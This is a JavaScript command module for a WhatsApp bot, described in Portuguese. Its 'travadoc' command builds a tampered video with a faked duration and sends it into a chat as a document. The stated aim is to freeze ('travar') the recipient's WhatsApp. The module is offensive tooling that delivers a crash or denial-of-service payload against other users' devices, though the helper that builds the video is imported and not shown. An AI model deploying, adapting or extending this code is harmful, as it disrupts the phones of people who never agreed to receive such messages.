import { PREFIX } from "../../config.js";
import {
  buildCaption,
  buildLockedVideo,
  resolveWantedSeconds,
} from "../../utils/trava.js";

export default {
  name: "TravaDoc",
  description: "Trava o WhatsApp com o vídeo adulterado enviado como documento.",
  commands: ["travadoc"],
  usage: `${PREFIX}travadoc [segundos]`,

  handle: async ({ remoteJid, socket, webMessage, args, sendReply, sendSuccessReact }) => {
    const wantedSeconds = resolveWantedSeconds(args);
    const { video, fakeDuration } = await buildLockedVideo(wantedSeconds);

    await sendReply(`⏳ Montando a trava em modo documento (${fakeDuration.toLocaleString("pt-BR")}s)...`);

    await socket.sendMessage(
      remoteJid,
      {
        document: video,
        mimetype: "video/mp4",
        fileName: `trava-${fakeDuration}s.mp4`,
        caption: buildCaption(fakeDuration, "   ☣︎ modo documento: patch preservado"),
      },
      { quoted: JSON.parse(JSON.stringify(webMessage)) },
    );

    await sendSuccessReact();
  },
};